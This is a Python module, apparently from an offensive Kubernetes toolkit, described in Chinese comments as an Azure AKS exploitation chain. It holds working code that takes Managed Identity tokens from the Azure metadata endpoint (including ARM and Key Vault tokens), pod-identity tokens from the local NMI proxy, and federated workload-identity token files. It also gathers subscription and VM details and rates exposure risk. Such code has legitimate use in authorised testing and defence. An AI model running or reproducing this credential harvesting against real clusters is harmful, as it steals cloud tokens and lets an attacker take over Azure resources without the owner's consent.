"""Azure AKS 利用链

Azure Instance Metadata Service (IMDS)、Managed Identity、AKS Cluster CA 利用。
"""

from typing import Any, Optional

from k8s_arsenal.cloud.base import CloudMetadataBase, CloudCredential


class AzureExploit(CloudMetadataBase):
    """Azure AKS 环境利用"""

    IMDS_BASE = "http://169.254.169.254/metadata"
    IMDS_HEADERS = {"Metadata": "true"}

    def detect(self) -> bool:
        """检测 Azure 环境"""
        # 方法 1: IMDS
        resp = self._http_get(
            f"{self.IMDS_BASE}/instance?api-version=2021-02-01",
            headers=self.IMDS_HEADERS,
        )
        if resp:
            return True

        # 方法 2: DMI
        try:
            with open("/sys/class/dmi/id/sys_vendor", "r") as f:
                if "microsoft" in f.read().lower():
                    return True
        except (FileNotFoundError, PermissionError):
            pass

        return False

    def get_credentials(self) -> Optional[CloudCredential]:
        """获取 Azure 临时凭证

        利用链:
        1. IMDS → Managed Identity Token
        2. Pod Identity (aadpodidentity)
        3. Workload Identity Federation
        """
        # 路径 1: Managed Identity (IMDS)
        cred = self._get_managed_identity_token()
        if cred:
            return cred

        # 路径 2: Azure AD Pod Identity
        cred = self._get_pod_identity_token()
        if cred:
            return cred

        # 路径 3: Workload Identity Federation
        return self._get_workload_identity_token()

    def _get_managed_identity_token(self, resource: str = "https://management.azure.com") -> Optional[CloudCredential]:
        """通过 IMDS 获取 Managed Identity Token

        Azure 节点上的默认 Managed Identity 可能拥有广泛的订阅权限。
        """
        url = (
            f"{self.IMDS_BASE}/identity/oauth2/token"
            f"?api-version=2018-02-01"
            f"&resource={resource}"
        )
        resp = self._http_get(url, headers=self.IMDS_HEADERS)
        if not resp:
            return None

        try:
            import json
            token_data = json.loads(resp)
            return CloudCredential(
                provider="azure",
                session_token=token_data.get("access_token"),
                expires_at=token_data.get("expires_on"),
                extra={
                    "token_type": token_data.get("token_type"),
                    "resource": resource,
                },
            )
        except json.JSONDecodeError:
            pass

        return None

    def _get_pod_identity_token(self) -> Optional[CloudCredential]:
        """Azure AD Pod Identity

        通过 NMI (Node Managed Identity) 代理获取 token。
        """
        # Pod Identity 通常通过 localhost:2579 的 NMI 代理
        resp = self._http_get(
            "http://localhost:2579/host/token/",
            headers={"Metadata": "true"},
            timeout=1,
        )
        if resp:
            try:
                import json
                data = json.loads(resp)
                return CloudCredential(
                    provider="azure",
                    session_token=data.get("access_token"),
                    extra={"source": "pod_identity_nmi"},
                )
            except json.JSONDecodeError:
                pass
        return None

    def _get_workload_identity_token(self) -> Optional[CloudCredential]:
        """Workload Identity Federation

        检查环境变量和挂载路径。
        """
        import os

        # Azure WI 通过 AZURE_CLIENT_ID + AZURE_TENANT_ID + AZURE_FEDERATED_TOKEN_FILE
        token_file = os.environ.get("AZURE_FEDERATED_TOKEN_FILE")
        client_id = os.environ.get("AZURE_CLIENT_ID")
        tenant_id = os.environ.get("AZURE_TENANT_ID")

        if token_file and client_id:
            try:
                with open(token_file, "r") as f:
                    token = f.read().strip()
                return CloudCredential(
                    provider="azure",
                    session_token=token,
                    extra={
                        "source": "workload_identity",
                        "client_id": client_id,
                        "tenant_id": tenant_id,
                    },
                )
            except (FileNotFoundError, PermissionError):
                pass

        return None

    def get_instance_info(self) -> dict:
        """获取 Azure VM 实例信息"""
        info: dict[str, Any] = {}
        resp = self._http_get(
            f"{self.IMDS_BASE}/instance?api-version=2021-02-01",
            headers=self.IMDS_HEADERS,
        )
        if not resp:
            return info

        try:
            import json
            data = json.loads(resp)
            compute = data.get("compute", {})
            info = {
                "vm_id": compute.get("vmId"),
                "name": compute.get("name"),
                "location": compute.get("location"),
                "resource_group": compute.get("resourceGroupName"),
                "subscription_id": compute.get("subscriptionId"),
                "vm_size": compute.get("vmSize"),
            }
        except json.JSONDecodeError:
            pass

        return info

    def get_arm_access_token(self) -> Optional[str]:
        """获取 Azure Resource Manager access token

        用于后续 ARM API 调用（如枚举 AKS 集群）。
        """
        cred = self._get_managed_identity_token("https://management.azure.com")
        if cred and cred.session_token:
            return cred.session_token
        return None

    def get_keyvault_token(self) -> Optional[str]:
        """获取 Key Vault access token"""
        cred = self._get_managed_identity_token("https://vault.azure.net")
        if cred and cred.session_token:
            return cred.session_token
        return None


def check_aks_risk(kubeconfig: Optional[str] = None) -> dict:
    """检查 AKS 环境风险"""
    result = {
        "managed_identity_token_accessible": False,
        "pod_identity_configured": False,
        "workload_identity_configured": False,
        "risk_level": "none",
        "description": "",
    }

    import os

    # 检查 WI
    if os.environ.get("AZURE_FEDERATED_TOKEN_FILE"):
        result["workload_identity_configured"] = True

    # 检查 Pod Identity
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex(("localhost", 2579)) == 0:
            result["pod_identity_configured"] = True
        s.close()
    except Exception:
        pass

    # 检查 IMDS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex(("169.254.169.254", 80)) == 0:
            result["managed_identity_token_accessible"] = True
        s.close()
    except Exception:
        pass

    if (result["managed_identity_token_accessible"]
            or result["workload_identity_configured"]
            or result["pod_identity_configured"]):
        result["risk_level"] = "high"
        result["description"] = "Azure 环境可通过 IMDS / Pod Identity / Workload Identity 获取云凭证"

    return result
